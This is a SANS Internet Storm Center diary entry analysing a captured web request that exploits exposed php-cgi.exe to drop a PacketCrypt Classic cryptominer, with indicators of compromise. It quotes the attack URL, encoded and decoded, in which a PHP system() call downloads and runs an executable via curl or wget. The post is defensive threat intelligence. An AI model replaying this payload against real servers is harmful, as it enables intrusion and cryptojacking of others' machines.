---
title: PacketCrypt Classic Cryptocurrency Miner on PHP Servers, (Tue, Jan 7th)
url: https://isc.sans.edu/diary/rss/31564
source: SANS Internet Storm Center, InfoCON: green
date: 2025-01-08
fetch_date: 2025-10-06T20:11:52.738581
---

# PacketCrypt Classic Cryptocurrency Miner on PHP Servers, (Tue, Jan 7th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31560)
* [next](/diary/31568)

# [PacketCrypt Classic Cryptocurrency Miner on PHP Servers](/forums/diary/PacketCrypt%2BClassic%2BCryptocurrency%2BMiner%2Bon%2BPHP%2BServers/31564/)

**Published**: 2025-01-07. **Last Updated**: 2025-01-15 14:10:13 UTC
**by** [Yee Ching Tok](https://poppopretn.com/aboutme/) (Version: 1)

[0 comment(s)](/diary/PacketCrypt%2BClassic%2BCryptocurrency%2BMiner%2Bon%2BPHP%2BServers/31564/#comments)

The SANS DShield project receives a wide variety of logs submitted by participants of the DShield project. Looking at the “[First Seen](https://isc.sans.edu/weblogs/firstseenurls.html)” URLs page, I observed an interesting URL and dived deeper to investigate. The URL recorded is as follows:

> `/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('curl%20-L%20-k%20-O%20http%3A%2F%2F[redacted]%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F[redacted]%2Fdr0p.exe%20%26%26%20`

Let’s make it more readable via the quintessential CyberChef or another web proxy tool such as Burp Decoder:

> `/cgi-bin/php-cgi.exe?arg= Content-Type: text/plain <?php system('curl -L -k -O http://[redacted]/dr0p.exe && ./dr0p.exe || wget --no-check-certificate http://[redacted]/dr0p.exe &&`

Interesting. As the name implies, it looks like an executable that is designed to download a secondary payload. A quick search of the filename yielded a recent VirusTotal (VT) submission [[1](https://www.virustotal.com/gui/file/d078d8690446e831acc794ee2df5dfabcc5299493e7198993149e3c0c33ccb36)] and a SHA256 hash of `d078d8690446e831acc794ee2df5dfabcc5299493e7198993149e3c0c33ccb36`.

Some brief dynamic malware reverse engineering yielded very interesting observations. Firstly, `dr0p.exe` went ahead to retrieve a secondary file `pkt1.exe` (`e3d0c31608917c0d7184c220d2510848f6267952c38f86926b15fb53d07bd562`) from `23.27.51.244`. According to Shodan (and with reference to **Figure 1**), the US-based IP address had 4 open ports (22, 80, 110, and 6664) and was running the EvilBit Block Explorer on port 80.

[![](https://isc.sans.edu/diaryimages/images/07012025_1_1.png)](https://isc.sans.edu/weblogs/firstseenurls.html)
**Figure 1:** Querying 23.27.51.244 on Shodan

The file `pkt1.exe` further spawns an executable `packetcrypt.exe` and passes a PacketCrypt (PKT Classic) wallet address (`pkt1qxysc58g4cwwautg6dr4p7q7sd6tn2ldgukth5a`) as part of the arguments. Let us take a look at the mining done so far via the native PKT Classic (PKTC) blockchain explorer [[2](https://www.pkt.world/explorer?wallet=pkt1qxysc58g4cwwautg6dr4p7q7sd6tn2ldgukth5a&minutes=1440&pools=all)]. With reference to **Figure 2**, the owner of the wallet appears to have made 5 PKTC so far (roughly about 0.0021785USDT at current prices).

![](https://isc.sans.edu/diaryimages/images/07012025_1_2.png)
**Figure 2:** PacketCrypt Classic (PKTC) Wallet Activity

The observed web URL activity appears to exploit vulnerable (such as the recent [CVE-2024-4577](https://isc.sans.edu/diary/Attacker%2BProbing%2Bfor%2BNew%2BPHP%2BVulnerablity%2BCVE20244577/30994)) PHP servers or misconfigured PHP servers that allow unfettered public access to `php-cgi.exe` for reasons only known to system owners. If you have not checked on your PHP servers for a while (which should never be the case!), perhaps this is a gentle reminder for systems owners to patch and audit their web servers for vulnerabilities and unintended performance issues caused by crypto miners.

Side note: During the investigation, it was noted that the PacketCrypt (PKT) project evolved from a proof-of-work approach [now known as PKT Classic (PKTC)] to a new Stake-to-Earn (currently known as PKT) approach [[3](https://crypto.pkt.cash/announcements/pktclassic-adopts-new-ticker-pktc/)]. As such, there is a distinction in the cryptocurrency for the legacy project (PKTC) and the current iteration (PKT). In this diary, the mined cryptocurrency on vulnerable PHP servers is PKTC.

Indicators-of-Compromise (IoCs):

[23.27.51.244](/ipinfo.html?ip=23.27.51.244) (IP address where pkt1.exe is retrieved)
d078d8690446e831acc794ee2df5dfabcc5299493e7198993149e3c0c33ccb36 (SHA256 hash of dr0p.exe)
e3d0c31608917c0d7184c220d2510848f6267952c38f86926b15fb53d07bd562 (SHA256 hash of pkt1.exe)
717fe92a00ab25cae8a46265293e3d1f25b2326ecd31406e7a2821853c64d397 (SHA256 hash of packetcrypt.exe)
pkt1qxysc58g4cwwautg6dr4p7q7sd6tn2ldgukth5a (PKTC Wallet Address)

**References:**
1. https://www.virustotal.com/gui/file/d078d8690446e831acc794ee2df5dfabcc5299493e7198993149e3c0c33ccb36
2. https://www.pkt.world/explorer?wallet=pkt1qxysc58g4cwwautg6dr4p7q7sd6tn2ldgukth5a&minutes=1440&pools=all
3. https://crypto.pkt.cash/announcements/pktclassic-adopts-new-ticker-pktc/

-----------
Yee Ching Tok, Ph.D., ISC Handler
[Personal Site](https://poppopretn.com)
[Mastodon](https://infosec.exchange/%40poppopretn)
[Twitter](https://twitter.com/poppopretn)

Keywords: [PKTC](/tag.html?tag=PKTC) [PacketCrypt Classic](/tag.html?tag=PacketCrypt Classic) [PacketCrypt](/tag.html?tag=PacketCrypt) [cryptominer](/tag.html?tag=cryptominer)

[0 comment(s)](/diary/PacketCrypt%2BClassic%2BCryptocurrency%2BMiner%2Bon%2BPHP%2BServers/31564/#comments)

* [previous](/diary/31560)
* [next](/diary/31568)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)